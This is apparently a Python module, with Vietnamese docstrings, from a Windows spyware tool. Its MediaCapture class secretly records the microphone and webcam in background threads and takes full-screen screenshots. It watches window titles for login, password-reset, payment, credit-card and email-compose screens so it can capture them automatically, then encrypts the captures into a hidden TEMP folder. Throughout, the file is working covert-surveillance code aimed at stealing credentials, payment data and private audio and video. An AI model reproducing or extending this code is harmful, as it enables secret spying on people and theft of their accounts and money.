import os
import cv2
import pyaudio
import wave
import numpy as np
import threading
import time
import logging
from typing import Dict, List, Optional
from datetime import datetime
from PIL import ImageGrab
import win32gui
import win32con
import win32process

class MediaCapture:
    """Thu thập screenshots, audio và webcam footage"""
    
    def __init__(self, output_dir: str = None):
        self.logger = logging.getLogger('media_capture')
        self.output_dir = output_dir or os.path.join(os.getenv('TEMP'), 'media_capture')
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Audio config
        self.audio_format = pyaudio.paFloat32
        self.channels = 1
        self.rate = 44100
        self.chunk = 1024
        self.audio_recording = False
        
        # Video config
        self.webcam_recording = False
        self.webcam_device = 0
        
        # Screenshot config
        self.screenshot_events = {
            'login': [
                r'.*login.*', r'.*sign.*in.*', r'.*authenticate.*'
            ],
            'password_change': [
                r'.*change.*password.*', r'.*reset.*password.*'
            ],
            'payment': [
                r'.*payment.*', r'.*credit.*card.*', r'.*checkout.*'
            ],
            'email': [
                r'.*email.*compose.*', r'.*new.*message.*'
            ]
        }
        
        # Storage config
        self.max_storage = 1024 * 1024 * 1024  # 1GB
        self.current_storage = 0
        
        # Encryption
        self._init_encryption()
        
    def _init_encryption(self):
        """Khởi tạo encryption"""
        try:
            from cryptography.fernet import Fernet
            self.key = Fernet.generate_key()
            self.cipher = Fernet(self.key)
        except Exception:
            self.cipher = None
            
    def start_audio_recording(self, duration: int = None):
        """Start ghi âm từ microphone
        
        Args:
            duration: Thời lượng ghi âm (giây), None = ghi liên tục
        """
        if self.audio_recording:
            return
            
        def record():
            try:
                audio = pyaudio.PyAudio()
                stream = audio.open(
                    format=self.audio_format,
                    channels=self.channels,
                    rate=self.rate,
                    input=True,
                    frames_per_buffer=self.chunk
                )
                
                frames = []
                start_time = time.time()
                
                self.audio_recording = True
                while self.audio_recording:
                    if duration and time.time() - start_time > duration:
                        break
                        
                    data = stream.read(self.chunk)
                    frames.append(data)
                    
                    # Check storage limit
                    self.current_storage += len(data)
                    if self.current_storage >= self.max_storage:
                        break
                        
                stream.stop_stream()
                stream.close()
                audio.terminate()
                
                # Save recording
                filename = os.path.join(
                    self.output_dir,
                    f'audio_{int(start_time)}.wav'
                )
                
                wf = wave.open(filename, 'wb')
                wf.setnchannels(self.channels)
                wf.setsampwidth(audio.get_sample_size(self.audio_format))
                wf.setframerate(self.rate)
                wf.writeframes(b''.join(frames))
                wf.close()
                
                # Encrypt file
                if self.cipher:
                    with open(filename, 'rb') as f:
                        data = f.read()
                    encrypted = self.cipher.encrypt(data)
                    with open(filename + '.enc', 'wb') as f:
                        f.write(encrypted)
                    os.remove(filename)
                    
            except Exception as e:
                self.logger.error(f"Audio recording error: {str(e)}")
                self.audio_recording = False
                
        thread = threading.Thread(target=record)
        thread.daemon = True
        thread.start()
        
    def stop_audio_recording(self):
        """Stop ghi âm"""
        self.audio_recording = False
        
    def start_webcam_recording(self, duration: int = None):
        """Start ghi hình từ webcam
        
        Args:
            duration: Thời lượng ghi hình (giây), None = ghi liên tục
        """
        if self.webcam_recording:
            return
            
        def record():
            try:
                cap = cv2.VideoCapture(self.webcam_device)
                if not cap.isOpened():
                    raise Exception("Could not open webcam")
                    
                # Get video info
                fps = int(cap.get(cv2.CAP_PROP_FPS))
                width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                
                # Create video writer
                filename = os.path.join(
                    self.output_dir,
                    f'webcam_{int(time.time())}.avi'
                )
                
                out = cv2.VideoWriter(
                    filename,
                    cv2.VideoWriter_fourcc(*'XVID'),
                    fps, (width, height)
                )
                
                start_time = time.time()
                self.webcam_recording = True
                
                while self.webcam_recording:
                    if duration and time.time() - start_time > duration:
                        break
                        
                    ret, frame = cap.read()
                    if not ret:
                        break
                        
                    out.write(frame)
                    
                    # Check storage
                    self.current_storage += frame.nbytes
                    if self.current_storage >= self.max_storage:
                        break
                        
                cap.release()
                out.release()
                
                # Encrypt file
                if self.cipher:
                    with open(filename, 'rb') as f:
                        data = f.read()
                    encrypted = self.cipher.encrypt(data)
                    with open(filename + '.enc', 'wb') as f:
                        f.write(encrypted)
                    os.remove(filename)
                    
            except Exception as e:
                self.logger.error(f"Webcam recording error: {str(e)}")
                self.webcam_recording = False
                
        thread = threading.Thread(target=record)
        thread.daemon = True
        thread.start()
        
    def stop_webcam_recording(self):
        """Stop ghi hình webcam"""
        self.webcam_recording = False
        
    def take_screenshot(self, reason: str = None):
        """Chụp screenshot
        
        Args:
            reason: Lý do chụp screenshot (login/password_change/etc)
        """
        try:
            # Get active window info
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            window_title = win32gui.GetWindowText(hwnd)
            
            # Take screenshot
            screen = ImageGrab.grab()
            
            # Save image
            filename = os.path.join(
                self.output_dir,
                f'screenshot_{int(time.time())}.png'
            )
            
            screen.save(filename)
            
            # Add metadata
            metadata = {
                'timestamp': datetime.now().isoformat(),
                'reason': reason,
                'window_title': window_title,
                'process_id': pid
            }
            
            with open(filename + '.meta', 'w') as f:
                f.write(str(metadata))
                
            # Encrypt if needed
            if self.cipher:
                with open(filename, 'rb') as f:
                    data = f.read()
                encrypted = self.cipher.encrypt(data)
                with open(filename + '.enc', 'wb') as f:
                    f.write(encrypted)
                os.remove(filename)
                
            return filename
            
        except Exception as e:
            self.logger.error(f"Screenshot error: {str(e)}")
            return None
            
    def monitor_for_events(self):
        """Monitor window titles để tự động chụp screenshot"""
        try:
            last_title = ''
            
            while True:
                hwnd = win32gui.GetForegroundWindow()
                window_title = win32gui.GetWindowText(hwnd).lower()
                
                if window_title != last_title:
                    # Check each event pattern
                    for event, patterns in self.screenshot_events.items():
                        if any(re.match(p, window_title) for p in patterns):
                            self.take_screenshot(event)
                            break
                            
                    last_title = window_title
                    
                time.sleep(0.5)  # Prevent high CPU usage
                
        except Exception as e:
            self.logger.error(f"Event monitoring error: {str(e)}")
            
    def start_monitoring(self):
        """Start monitoring cho screenshot events"""
        thread = threading.Thread(target=self.monitor_for_events)
        thread.daemon = True
        thread.start()
        
    def cleanup(self):
        """Dọn dẹp temporary files"""
        try:
            # Stop recordings
            self.audio_recording = False
            self.webcam_recording = False
            
            # Remove temp files
            for file in os.listdir(self.output_dir):
                try:
                    os.remove(os.path.join(self.output_dir, file))
                except Exception:
                    pass
                    
            os.rmdir(self.output_dir)
            
        except Exception as e:
            self.logger.error(f"Cleanup error: {str(e)}")